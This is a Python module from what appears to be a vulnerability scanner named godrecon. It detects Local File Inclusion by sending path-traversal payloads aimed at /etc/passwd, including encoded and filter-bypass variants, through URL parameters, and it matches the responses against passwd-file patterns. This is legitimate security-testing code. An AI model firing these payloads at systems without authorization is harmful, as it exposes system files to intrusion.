"""P2 — Local File Inclusion (LFI) detector."""

from __future__ import annotations

import re
from typing import Any, List

from godrecon.modules.base import Finding
from godrecon.utils.logger import get_logger

logger = get_logger(__name__)

_LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    r"....\/....\/etc/passwd",
    "/etc/passwd",
]

_LFI_PATTERNS = [
    r"root:x:0:0",
    r"bin:x:",
    r"daemon:x:",
]


class LFIDetector:
    """Detects Local File Inclusion vulnerabilities in URL parameters."""

    def __init__(
        self,
        http_client: Any,
        safe_mode: bool = True,
        max_payloads: int = 10,
    ) -> None:
        self.http = http_client
        self.safe_mode = safe_mode
        self.max_payloads = max_payloads

    async def scan(self, url: str, params: List[str]) -> List[Finding]:
        """Scan URL parameters for LFI."""
        findings: List[Finding] = []

        for param in params:
            for payload in _LFI_PAYLOADS[: self.max_payloads]:
                try:
                    resp = await self.http.get(url, params={param: payload})
                    if not resp:
                        continue
                    body = resp.get("body", "") or ""
                    for pattern in _LFI_PATTERNS:
                        if re.search(pattern, body):
                            findings.append(Finding(
                                title=f"Local File Inclusion — {url}",
                                description=(
                                    f"Parameter '{param}' is vulnerable to LFI. "
                                    f"Payload: {payload}"
                                ),
                                severity="high",
                                confidence=0.95,
                                data={
                                    "url": url,
                                    "param": param,
                                    "payload": payload,
                                    "method": "GET",
                                },
                                tags=["lfi", "p2", "high"],
                                evidence=f"File content pattern '{pattern}' matched in response",
                            ))
                            break
                except Exception as exc:
                    logger.debug("LFI scan error: %s", exc)

        return findings
